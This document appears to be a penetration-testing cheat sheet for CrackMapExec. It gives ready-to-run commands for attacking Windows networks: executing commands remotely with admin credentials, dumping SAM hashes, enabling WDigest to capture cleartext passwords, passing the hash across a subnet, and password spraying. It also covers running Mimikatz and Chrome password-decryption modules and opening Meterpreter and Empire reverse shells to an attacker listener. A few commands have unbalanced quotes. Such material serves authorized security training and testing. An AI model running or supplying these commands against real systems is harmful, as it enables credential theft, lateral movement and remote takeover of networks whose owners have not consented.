[source](https://www.ivoidwarranties.tech/posts/pentesting-tuts/cme/crackmapexec-cheatsheet/}

### crackmapexec examples

##### Network Enumeration
```
crackmapexec 192.168.10.0/24
```

##### Command Execution
```
crackmapexec 192.168.10.11 -u Administrator -p 'P@ssw0rd' -x whoami

crackmapexec 192.168.215.104 -u 'Administrator' -p 'PASS' -x 'net user Administrator /domain' --exec-method smbexec
```
##### execute PowerShell commands using the -X flag:
```
#~ crackmapexec 192.168.10.11 -u Administrator -p 'P@ssw0rd' -X '$PSVersionTable'
```
##### Key Commands

##### Checked for logged in users
```
crackmapexec 192.168.215.104 -u 'Administrator' -p 'PASS' --lusers
```

##### Using Local Auth

Allows you to use local accounts rather than domain creds.
```
crackmapexec 192.168.215.138 -u 'Administrator' -p 'PASSWORD' --local-auth
```
##### Enumerating Shares
```
crackmapexec 192.168.215.138 -u 'Administrator' -p 'PASSWORD' --local-auth --shares
```
##### WDigest Enable/Disable

This allows us to re-enable the WDigest provider and dump clear-text credentials from LSA memory
```
crackmapexec 192.168.215.104 -u 'Administrator' -p 'PASS' --local-auth --wdigest enable
crackmapexec 192.168.215.104 -u 'Administrator' -p 'PASS' --local-auth --wdigest disable
```
##### Password Policy

One useful query enumerates the domain’s password policy including complexity requirements
```
crackmapexec 192.168.215.104 -u 'Administrator' -p 'PASS --pass-pol
```
##### RID Bruteforcing

you can use the rid-brute option to enumerate all AD objects including users and groups by guessing every resource identifier (RID), which is the ending set of digits to a security identifier (SID). 
```
crackmapexec 192.168.215.104 -u 'Administrator' -p 'PASS --rid-brute
```
##### Top Credential Attacks
Dumping the local SAM hashes
```
crackmapexec 192.168.215.104 -u 'Administrator' -p 'PASS' --local-auth --sam
```
##### Passing-the-Hash against subnet

Login to all subnet machines via smb with admin + hash. By using the –local-auth and a found local admin password this can be used to login to a whole subnets smb enabled machines with that local admin pass/hash.
```
cme smb 172.16.157.0/24 -u administrator -H 'aad3b435b51404eeaa35b51404ee:5509de4fa6e8d9f4a61100e51' --local-auth
```
##### NULL Sessions

You can log in with a null session by using '’ as the username and/or password

Examples:
```
crackmapexec smb <target(s)> -u '' -p ''
```
##### Brute Forcing & Password Spraying

We can do this by pointing crackmapexec at the subnet and passing the creds:

##### SMB Login Example
```
crackmapexec 10.0.2.0/24 -u ‘admin’ -p ‘P@ssw0rd’
```
##### Bruteforcing examples

Examples:
```
crackmapexec <protocol> <target(s)> -u username1 -p password1 password2

crackmapexec <protocol> <target(s)> -u username1 username2 -p password1

crackmapexec <protocol> <target(s)> -u ~/file_containing_usernames -p ~/file_containing_passwords

crackmapexec <protocol> <target(s)> -u ~/file_containing_usernames -H ~/file_containing_ntlm_hashes
```
##### Modules
Listing Modules
```
crackmapexec -L
[*] empire_exec          Uses Empire's RESTful API to generate a launcher for the specified listener and executes it
[*] shellinject          Downloads the specified raw shellcode and injects it into memory using PowerSploit's Invoke-Shellcode.ps1 script
[*] rundll32_exec        Executes a command using rundll32 and Windows's native javascript interpreter
[*] com_exec             Executes a command using a COM scriptlet to bypass whitelisting
[*] tokenrider           Allows for automatic token enumeration, impersonation and mass lateral spread using privileges instead of dumped credentials
[*] mimikatz             Executes PowerSploit's Invoke-Mimikatz.ps1 script
[*] tokens               Enumerates available tokens using Powersploit's Invoke-TokenManipulation
[*] peinject             Downloads the specified DLL/EXE and injects it into memory using PowerSploit's Invoke-ReflectivePEInjection.ps1 script
[*] powerview            Wrapper for PowerView's functions
[*] mimikittenz          Executes Mimikittenz
[*] enum_chrome          Uses Powersploit's Invoke-Mimikatz.ps1 script to decrypt saved Chrome passwords
[*] metinject            Downloads the Meterpreter stager and injects it into memory using PowerSploit's Invoke-Shellcode.ps1 script
[*] eventvwr_bypass      Executes a command using the eventvwr.exe fileless UAC bypass
```
##### SMB Mimikatz module
```
sudo cme 192.168.215.104 -u 'Administrator' -p 'PASS' --local-auth -M mimikatz
```
Module options are specified with the -o flag. All options are specified in the form of KEY=value (msfvenom style)

Example:
```
cme <protocol> <target(s)> -u Administrator -p 'P@ssw0rd' -M mimikatz -o COMMAND='privilege::debug'
```
##### Modules - Enum_Chrome
```
sudo cme 192.168.215.104 -u 'Administrator' -p 'PASS' --local-auth -M enum_chrome
```
##### Modules - Enum_AV

Another piece of useful information CrackMapExec can gather is what anti-virus software is in use.
```
sudo cme 192.168.215.104 -u 'Administrator' -p 'PASS' --local-auth -m enum_avproducts
```
##### Getting Shells with CrackMapExec
Metasploit

Need to setup Http Reverse Handler in MsfConsole
```
sudo cme 192.168.215.104 -u 'Administrator' -p 'PASS' --local-auth -M met_inject -o LHOST=192.168.215.109 LPORT=5656 
```
##### Empire

Start RESTful API
```
 empire --rest --user empireadmin --pass gH25Iv1K68@^
```
Launch empire listener to target
```
sudo cme 192.168.215.104 -u Administrator -p PASSWORD --local-auth -M empire_exec -o LISTENER=CMETest
```
